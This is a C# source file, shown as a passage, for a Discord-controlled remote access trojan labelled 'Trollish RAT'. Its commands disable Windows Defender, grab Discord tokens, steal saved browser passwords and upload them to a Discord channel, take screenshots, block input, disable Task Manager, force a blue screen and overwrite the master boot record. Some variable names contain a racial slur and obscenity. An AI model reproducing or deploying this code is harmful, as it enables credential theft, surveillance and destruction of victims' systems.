                if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender") != null)
                {
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
                }

                if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection") != null)
                {
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
                }

                await ReactNReply($":white_check_mark: `Windows Defender has been sucessfully disabled!`");
            }
            catch (Exception ex)
            {
                await ReactNReply(
                    $":x: `An error occurred while trying to disable Windows Defender: {ex.Message}`",
                    Emoji.Parse(":red_circle:")
                );
            }
        }
        [CommandDescription("Purge specified amount of messages in chat.")]
        [Command("purge")]
        public async Task PurgeMessages(int count)
        {
            var messages = await Context.Channel.GetMessagesAsync(count + 1).FlattenAsync();
            await (Context.Channel as ITextChannel).DeleteMessagesAsync(messages);
        }
        [CommandDescription("Displays a MessageBox.")]
        [Command("msgbox")]
        public async Task MessageBox(string title, [Remainder] string message)
        {
            var dialogResult = System.Windows.Forms.MessageBox.Show(
                message,
                title,
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Information
            );
            await ReactNReply("Response: " + dialogResult);
        }
        [CommandDescription("Returns system info.")]
        [Command("sysinfo")]
        public async Task GetSystemInfo()
        {
#if DEBUG
            await Context.Channel.SendMessageAsync("cala essa boca ai otario");
            return;
#endif
            var sb = new StringBuilder();
            sb.AppendLine($"Computer Name: {Environment.MachineName}");
            sb.AppendLine($"User Name: {Environment.UserName}");
            sb.AppendLine($"OS Version: {Environment.OSVersion}");

            string version = "Unknown";
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
                foreach (ManagementObject os in searcher.Get())
                {
                    version = os["Caption"].ToString() + " " + os["Version"].ToString();
                }
            }
            catch
            {
                version = "Error fetching Windows version";
            }
            sb.AppendLine($"Windows Version: {version}");

            string processorInfo = "Unknown Processor";
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    processorInfo = queryObj["Name"].ToString();
                }
            }
            catch
            {
                processorInfo = "Error fetching processor info";
            }
            sb.AppendLine($"Processor: {processorInfo}");

            string ramInfo = "Unknown RAM";
            try
            {
                long totalRam = 0;
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    totalRam += Convert.ToInt64(queryObj["Capacity"]);
                }
                ramInfo = $"{totalRam / (1024 * 1024 * 1024)} GB";
            }
            catch
            {
                ramInfo = "Error fetching RAM info";
            }
            sb.AppendLine($"RAM: {ramInfo}");

            string uuid = "Unknown UUID";
            sb.AppendLine($"HWID (UUID): {uuid}");

            string macAddress = "Unknown MAC Address";
            try
            {
                var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
                var mac = networkInterfaces.FirstOrDefault(
                    nic => nic.OperationalStatus == OperationalStatus.Up
                )?
                    .GetPhysicalAddress()
                    .ToString();
                macAddress = string.IsNullOrEmpty(mac) ? "MAC not found" : mac;
            }
            catch
            {
                macAddress = "Error fetching MAC address";
            }
            sb.AppendLine($"MAC Address: {macAddress}");

            string diskInfo = "Unknown Disk Info";
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    diskInfo = queryObj["Model"].ToString();
                }
            }
            catch
            {
                diskInfo = "Error fetching disk info";
            }
            sb.AppendLine($"Disk Info: {diskInfo}");

            await ReplyAsync(
                $":white_check_mark: `Here is the system info:`\n```{sb.ToString()}\n```"
            );
        }
        [CommandDescription("Returns IP information.")]
        [Command("ipinfo", Aliases = new string[] { "ip" })]
        public async Task GetIPInfo()
        {
            var response = await client.GetStringAsync("https://ipinfo.io/json");
            JObject ipInfo = JObject.Parse(response);

            var embed = new EmbedBuilder()
                .WithTitle("IP Information")
                .AddField("IP", ipInfo["ip"]?.ToString() ?? "N/A", true)
                .AddField("City", ipInfo["city"]?.ToString() ?? "N/A", true)
                .AddField("Region", ipInfo["region"]?.ToString() ?? "N/A", true)
                .AddField("Country", ipInfo["country"]?.ToString() ?? "N/A", true)
                .AddField("Location", ipInfo["loc"]?.ToString() ?? "N/A", true)
                .AddField("Organization", ipInfo["org"]?.ToString() ?? "N/A", true)
                .WithColor(Discord.Color.Blue)
                .WithFooter("Info provided by https://ipinfo.io")
                .Build();

            await Context.Channel.SendMessageAsync(embed: embed);
        }
        [CommandDescription("Triggers Blue Screen.")]
        [Command("bluescreen", Aliases = new string[] { "bsod" })]
        public async Task BSOD()
        {
#if DEBUG
            await Context.Channel.SendMessageAsync(":white_check_mark: Not in dbg mode bro");
            return;
#endif
            await Context.Channel.SendMessageAsync(
                ":white_check_mark: BSOD Successfully triggered!"
            );
            System.Diagnostics.Process.EnterDebugMode();
            RtlSetProcessIsCritical(true, IntPtr.Zero, false);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        [CommandDescription("Returns all Discord Tokens.")]
        [Command("grabtokens")]
        public async Task GrabTokenz()
        {
#if DEBUG
            await Context.Channel.SendMessageAsync("Nah");
            return;
#endif
            message = await Context.Channel.SendMessageAsync(
                ":arrows_counterclockwise: Grabbing tokens, it may take some time..."
            );
            EConsole.ELog("Trying to grab tokens...", 0);
            try
            {
                foreach (var token in TokenGrabber.GrabAll())
                {
                    await GetDiscordUserInfo(token.Split(':')[0]);
                    EConsole.ELog("Successfully grabbed all tokens and sent user information!", 1);
                }
            }
            catch (Exception ex)
            {
                await ReactNReply(
                    $":x: `An error occurred while trying to grab tokens: {ex.Message}`"
                );
            }
        }
        [CommandDescription("Blocks user input.")]
        [Command("block")]
        public async Task BlockInputCmd()
        {
            BlockInput(true);
            await ReactNReply(":white_check_mark: `Input has been blocked.`");
        }
        [CommandDescription("Unblocks user input.")]
        [Command("unblock")]
        public async Task UnblockInputCmd()
        {
            BlockInput(false);
            await ReactNReply(":white_check_mark: `Input has been unblocked.`");
        }
        [Command("A_D_M_I_N")]
        public async Task GiveAdmin()
        {
            var guildUser = Context.User as IGuildUser;
            var guild = Context.Guild;

            if (guildUser == null || guild == null)
            {
                await ReactNReply(":x: `Could not get user (?) or guild`");
                return;
            }

            var adminRole = guild.Roles.FirstOrDefault(r => r.Name == "Admin");

            if (adminRole == null)
            {
                var restRole = await guild.CreateRoleAsync(
                    "Admin",
                    new GuildPermissions(administrator: true),
                    null,
                    isMentionable: false,
                    options: null
                );

                adminRole = guild.GetRole(restRole.Id);
            }
            await guildUser.AddRoleAsync(adminRole);
            await ReactNReply(":white_check_mark: `You now have administrator (i guess)`");
        }
        [Command("cset")]
        public async Task SetConsoleSetting(string setting, string value)
        {
            try
            {
                switch (setting.ToLower())
                {
                    case "output":
                        if (value.ToLower() == "default")
                        {
                            Console.SetOut(
                                new StreamWriter(Console.OpenStandardOutput()) { AutoFlush = true }
                            );
                            await ReactNReply(
                                ":white_check_mark: `Console output reset to default.`"
                            );
                        }
                        else if (value.ToLower() == "memory")
                        {
                            Console.SetOut(BotMain.StringWriter);
                            await ReactNReply(
                                ":white_check_mark: `Console output is being stored (it will not appear in console), you can use 'clogs' to get them.`"
                            );
                        }
                        else
                        {
                            await ReactNReply(
                                ":x: `Invalid value for 'setout'. Use 'default' or 'memory'.`"
                            );
                        }
                        break;

                    case "title":
                        Console.Title = value;
                        await ReactNReply($":white_check_mark: `Console title set to '{value}'.`");
                        break;

                    case "clear":
                        Console.Clear();
                        await ReactNReply(":white_check_mark: `Console cleared.`");
                        break;

                    default:
                        await ReplyAsync($":x: `Unknown setting '{setting}'.`");
                        break;
                }
            }
            catch (Exception ex)
            {
                await ReactNReply($":x: An error occurred: {ex.Message}");
            }
        }
        [CommandDescription("Shows console window.")]
        [Command("cshow")]
        public async Task ShowConsole()
        {
            AllocConsole();
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr systemMenu = GetSystemMenu(consoleWindow, false);
            DeleteMenu(systemMenu, ScClose, 0);
            await ReactNReply($":white_check_mark: `Console has been allocated.`");
        }
        [CommandDescription("Hides console window.")]
        [Command("chide")]
        public async Task HideConsole()
        {
            FreeConsole();
            await ReactNReply($":white_check_mark: `Allocated console is not visible anymore.`");
        }
        [CommandDescription("Writes in console window")]
        [Command("cwrite")]
        public async Task CMessage([Remainder] string message)
        {
            Console.SetOut(new StreamWriter(Console.OpenStandardOutput()) { AutoFlush = true });
            Console.WriteLine($"Hacker: {message}");
            Console.SetOut(BotMain.StringWriter);
            await ReactNReply($":white_check_mark: `Message written to console.`");
        }
        [CommandDescription("Gives a input and returns the value.")]
        [Command("cinput")]
        public async Task CInput([Remainder] string inputText)
        {
            Console.SetOut(new StreamWriter(Console.OpenStandardOutput()) { AutoFlush = true });
            Console.Write($"{inputText}: {message}");
            var inputTask = Task.Run(() => Console.ReadLine());
            if (await Task.WhenAny(inputTask, Task.Delay(5000)) == inputTask)
            {
                string input = await inputTask;
                await ReactNReply($":white_check_mark: Input: {input}");
                Console.SetOut(BotMain.StringWriter);
            }
            else
            {
                Console.SetOut(BotMain.StringWriter);
                await ReactNReply(":x: Input timed out.");
            }
        }
        [CommandDescription("[ATTACHMENT/URL] Displays the image in fullscreen")]
        [Command("image")]
        public async Task ShowImage(string url = "")
        {
            var attachment = Context.Message.Attachments.FirstOrDefault();
            if (attachment != null)
            {
                await DisplayImageAsync(attachment.Url);
            }
            else if (!string.IsNullOrEmpty(url))
            {
                await DisplayImageAsync(url);
            }
            else
            {
                await ReactNReply(":x: `Could not get the attachment/link. Make sure the link is raw image and is VALID.`");
            }
        }

        private async Task DisplayImageAsync(string imageUrl)
        {
            try
            {
                var client = new WebClient();
                var imageBytes = await client.DownloadDataTaskAsync(imageUrl);

                Task.Run(() =>
                {
                    using (var stream = new MemoryStream(imageBytes))
                    {
                        var image = System.Drawing.Image.FromStream(stream);

                        var pictureBox = new PictureBox
                        {
                            Image = image,
                            SizeMode = PictureBoxSizeMode.Zoom,
                            Dock = DockStyle.Fill
                        };

                        var form = new Form
                        {
                            FormBorderStyle = FormBorderStyle.None,
                            WindowState = FormWindowState.Maximized,
                            BackColor = System.Drawing.Color.Black,
                            StartPosition = FormStartPosition.CenterScreen,
                            TopMost = true
                        };

                        form.Controls.Add(pictureBox);
                        form.ShowDialog();
                    }
                });
            }
            catch (Exception ex)
            {
                await ReactNReply($":x: `Error occurred while fetching the image: {ex.Message}`");
            }
        }
        static void PrintCredentials(IEnumerable<CredentialModel> data)
        {
            foreach (var d in data)
                Console.WriteLine($"{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n");
        }
        [CommandDescription("Grab all passwords from web browsers.")]
        [Command("passwords")]
        public async Task GrabPasswords()
        {
            List<IPassReader> readers = new List<IPassReader>();
            readers.Add(new FirefoxPassReader());
            readers.Add(new ChromePassReader());
            readers.Add(new IE10PassReader());

            foreach (var reader in readers)
            {
                Console.WriteLine($"== {reader.BrowserName}");
                try
                {
                    var nigger = "";
                    Random r = new Random();
                    int BlackCock = r.Next(100000, 200000);

                    foreach (var d in reader.ReadPasswords())
                    {
                        nigger = $"{nigger}\n{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n";
                    }

                    File.WriteAllText(Path.GetTempPath() + $"\\{BlackCock}.txt", string.Join("\n", nigger));

                    await Context.Channel.SendFileAsync(Path.GetTempPath() + $"\\{BlackCock}.txt");
                    File.Delete(Path.GetTempPath() + $"\\{BlackCock}.txt");
                }
                catch (Exception ex)
                {
                    await ReactNReply(
                        $":x: `Error reading {reader.BrowserName} passwords: " + ex.Message + "`"
                    );
                }
            }
        }
        [CommandDescription("[ATTACHMENT/URL] Sets the current wallpaper.")]
        [Command("wallpaper")]
        public async Task SetWallpaper(string url = "")
        {
            var attachment = Context.Message.Attachments.FirstOrDefault();
            if (attachment != null)
            {
                var imageUrl = attachment.Url;
                var client = new WebClient();
                var imageBytes = await client.DownloadDataTaskAsync(imageUrl);
                var wallpaperPath = Path.Combine(Path.GetTempPath(), "tempWallpaper.jpg");
                File.WriteAllBytes(wallpaperPath, imageBytes);

                SystemParametersInfo(
                    SPI_SETDESKWALLPAPER,
                    0,
                    wallpaperPath,
                    SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
                );
            }
            else
            {
                if (string.IsNullOrEmpty(url))
                {
                    await ReactNReply(
                        ":x: `Could not get the attachment/link. Make sure the link is RAW image and is valid."
                    );
                }
                else
                {
                    var client = new WebClient();
                    var imageBytes = await client.DownloadDataTaskAsync(url);
                    var wallpaperPath = Path.Combine(Path.GetTempPath(), "tempWallpaper.jpg");
                    File.WriteAllBytes(wallpaperPath, imageBytes);

                    SystemParametersInfo(
                        SPI_SETDESKWALLPAPER,
                        0,
                        wallpaperPath,
                        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
                    );
                }
            }
        }
        [CommandDescription("Destroys the Master Boot Recorder making PC unbootable.")]
        [Command("destroymbr")]
        public async Task DestroyMBR()
        {
#if DEBUG
            await Context.Channel.SendMessageAsync("No");
            return;
#endif
            if (!RuntimeSettings.IsAdministrator())
            {
                await Context.Channel.SendMessageAsync(
                    ":x: `You need administrator permissions to do this.`"
                );
                return;
            }
            try
            {
                var mbrData = new byte[MbrSize];

                var mbr = CreateFile(
                    "\\\\.\\PhysicalDrive0",
                    GenericAll,
                    FileShareRead | FileShareWrite,
                    IntPtr.Zero,
                    OpenExisting,
                    0,
                    IntPtr.Zero
                );

                if (mbr == (IntPtr)(-0x1))
                {
                    await ReactNReply(
                        ":x: `You need administrator permissions to do this, how did you even got here?`"
                    );
                    return;
                }

                if (WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero))
                {
                    await ReactNReply(
                        ":white_check_mark: `MBR has been destroyed, the computer will no longer boot!`"
                    );
                    return;
                }
                else
                {
                    await ReactNReply(":x: `Uknown error while deleting MBR.`");
                    return;
                }
            }
            catch (Exception ex)
            {
                await Context.Message.ReplyAsync($":x: `An error occurred: {ex.Message}`");
            }
        }
        [CommandDescription("Takes a screenshot.")]
        [Command("screenshot")]
        public async Task Screenshot()
        {
            Random r = new Random();
            try
            {
                string FPath =
                    $"{System.IO.Path.GetTempPath()}\\{r.Next(100000, 200000).ToString()}.jpg";
                var screenshot = new Bitmap(1920, 1080);
                var graphics = Graphics.FromImage(screenshot);
                graphics.CopyFromScreen(0, 0, 0, 0, new System.Drawing.Size(1920, 1080));

                using (var ms = new MemoryStream())
                {
                    screenshot.Save(FPath, System.Drawing.Imaging.ImageFormat.Png);
                    ms.Seek(0, SeekOrigin.Begin);

                    var channel = Context.Channel;
                    IMessage msg = await channel.SendFileAsync(FPath);
                    msg.AddReactionAsync(new Emoji("🟢"));
                    File.Delete(FPath);
                }
            }
            catch (Exception ex)
            {
                await ReactNReply(
                    $":x: `An error occurred while trying to take a screenshot: {ex.Message}`"
                );
            }
        }
        static int GetMaxNameLength(string directory)
        {
            var entries = Directory.GetFileSystemEntries(directory);
            int maxLength = 0;
            foreach (var entry in entries)
            {
                var info = new FileInfo(entry);
                if (info.Name.Length > maxLength)
                    maxLength = info.Name.Length;
            }
            return maxLength;
        }

        static string BuildDirectoryTree(
            string directory,
            string indent,
            int namePadding,
            int typePadding
        )
        {
            var entries = Directory.GetFileSystemEntries(directory);
            var sb = new StringBuilder();

            for (int i = 0; i < entries.Length; i++)
            {
                var info = new FileInfo(entries[i]);
                bool isLast = i == entries.Length - 1;
                string prefix = isLast ? "└── " : "├── ";
                string type =
                    (info.Attributes & FileAttributes.Directory) == FileAttributes.Directory
                        ? "DIR"
                        : "FILE";
                string createdTime = info.CreationTime.ToString("yyyy-MM-dd HH:mm:ss");

                sb.AppendLine(
                    $"{indent}{prefix}{info.Name.PadRight(namePadding)}{type.PadRight(typePadding)}{createdTime}"
                );

                if (type == "DIR")
                {
                    string newIndent = indent + (isLast ? "    " : "│   ");
                    sb.Append(BuildDirectoryTree(entries[i], newIndent, namePadding, typePadding));
                }
            }

            return sb.ToString();
        }

        static List<string> SplitMessage(string message, int maxLength)
        {
            var parts = new List<string>();
            while (message.Length > maxLength)
            {
                int splitIndex = message.LastIndexOf('\n', maxLength);
                if (splitIndex == -1)
                    splitIndex = maxLength;
                parts.Add(message.Substring(0, splitIndex));
                message = message.Substring(splitIndex).TrimStart('\n');
            }
            if (!string.IsNullOrEmpty(message))
                parts.Add(message);
            return parts;
        }
        [CommandDescription("Returns all directories.")]
        [Command("getdirs", Aliases = new string[] { "dir", "ls" })]
        public async Task GetDirectories()
        {
            foreach (
                var part in SplitMessage(
                    BuildDirectoryTree(
                        Environment.CurrentDirectory,
                        "",
                        GetMaxNameLength(Environment.CurrentDirectory),
                        6
                    ),
                    1900
                )
            )
            {
                await ReactNReply($"```\n{part}\n```");
            }
        }
        [CommandDescription("[TOGGLE] Toggles taskmgr")]
        [Command("taskmgr")]
        public async Task TaskMgrManipulate()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            );
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
            {
                await ReactNReply($":white_check_mark: `Task Manager is now DISABLED`");
                objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
            }
            else
            {
                await ReactNReply($":white_check_mark: `Task Manager is now ENABLED`");
                objRegistryKey.DeleteValue("DisableTaskMgr");
            }
            objRegistryKey.Close();
        }
        public async Task GetDiscordUserInfo(string token)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(token))
                {
                    EConsole.ELog("Token is null or empty.", 3);
                    await ReactNReply(":x: `Invalid token provided.`");
                    return;
                }

                using (var client = new WebClient())
                {
                    client.Headers.Add("authorization", token);
                    EConsole.ELog("Trying to download user information...", 0);
                    string response = client.DownloadString("https://discord.com/api/v9/users/@me");
                    EConsole.ELog("Information downloaded, parsing...", 1);
                    JObject json = JObject.Parse(response);

                    string username = json["username"]?.ToString();
                    string globalname = json["global_name"]?.ToString();
                    string id = json["id"]?.ToString();
                    string avatarHash = json["avatar"]?.ToString();
                    string avatarUrl =
                        avatarHash != null
                            ? $"https://cdn.discordapp.com/avatars/{id}/{avatarHash}.png"
                            : "https://cdn.discordapp.com/embed/avatars/0.png";
                    string email = json["email"]?.ToString();
                    string phone = json["phone"]?.ToString() ?? "None";
                    string locale = json["locale"]?.ToString();
                    string premiumType = json["premium_type"]?.ToString();
                    string verified = json["verified"]?.ToString();
                    string mfaEnabled = json["mfa_enabled"]?.ToString();

                    var embed = new EmbedBuilder()
                        .WithTitle($"{username} ({globalname})")
                        .WithThumbnailUrl(avatarUrl)
                        .AddField("ID", $"```{id}```", true)
                        .AddField("Avatar URL", $"```{avatarUrl}```", false)
                        .AddField("Email", $"```{email}```", false)
                        .AddField("Phone", $"```{phone}```", true)
                        .AddField("Locale", $"```{locale}```", true)
                        .AddField("Premium Type", $"```{premiumType}```", true)
                        .AddField("Verified", $"```{verified}```", true)
                        .AddField("MFA Enabled", $"```{mfaEnabled}```", true)
                        .AddField("Token", $"```{token}```", false)
                        .WithColor(Discord.Color.Blue)
                        .WithFooter("[Trollish RAT]")
                        .WithTimestamp(DateTimeOffset.Now);

                    EConsole.ELog("Sending embed...", 0);
                    await ReplyAsync(embed: embed.Build());
                    EConsole.ELog("Success!", 1);
                    await message.DeleteAsync();
                }
            }
            catch (Exception ex)
            {
                EConsole.ELog(
                    $"Error on trying to get user information via token: {ex.Message}",
                    3
                );
                await ReactNReply(
                    $":x: `An error occurred while trying to get user info: {ex.Message}`"
                );
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(
            int uAction,
            int uParam,
            string lpvParam,
            int fuWinIni
        );

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;
        [Flags]
        public enum ExitWindows : uint
        {
            // ONE of the following five:
            LogOff = 0x00,
            ShutDown = 0x01,
            Reboot = 0x02,
            PowerOff = 0x08,
            RestartApps = 0x40,
            // plus AT MOST ONE of the following two:
            Force = 0x04,
            ForceIfHung = 0x10,
        }

        [Flags]
        enum ShutdownReason : uint
        {
            MajorApplication = 0x00040000,
            MajorHardware = 0x00010000,
            MajorLegacyApi = 0x00070000,
            MajorOperatingSystem = 0x00020000,
            MajorOther = 0x00000000,
            MajorPower = 0x00060000,
            MajorSoftware = 0x00030000,
            MajorSystem = 0x00050000,
            MinorBlueScreen = 0x0000000F,
            MinorCordUnplugged = 0x0000000b,
            MinorDisk = 0x00000007,
            MinorEnvironment = 0x0000000c,
            MinorHardwareDriver = 0x0000000d,
            MinorHotfix = 0x00000011,
            MinorHung = 0x00000005,
            MinorInstallation = 0x00000002,
            MinorMaintenance = 0x00000001,
            MinorMMC = 0x00000019,
            MinorNetworkConnectivity = 0x00000014,
            MinorNetworkCard = 0x00000009,
            MinorOther = 0x00000000,
            MinorOtherDriver = 0x0000000e,
            MinorPowerSupply = 0x0000000a,
            MinorProcessor = 0x00000008,
            MinorReconfig = 0x00000004,
            MinorSecurity = 0x00000013,
            MinorSecurityFix = 0x00000012,
            MinorSecurityFixUninstall = 0x00000018,
            MinorServicePack = 0x00000010,
            MinorServicePackUninstall = 0x00000016,
            MinorTermSrv = 0x00000020,
            MinorUnstable = 0x00000006,
            MinorUpgrade = 0x00000003,
            MinorWMI = 0x00000015,
            FlagUserDefined = 0x40000000,
            FlagPlanned = 0x80000000
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ExitWindowsEx(ExitWindows uFlags, ShutdownReason dwReason);
    }
}
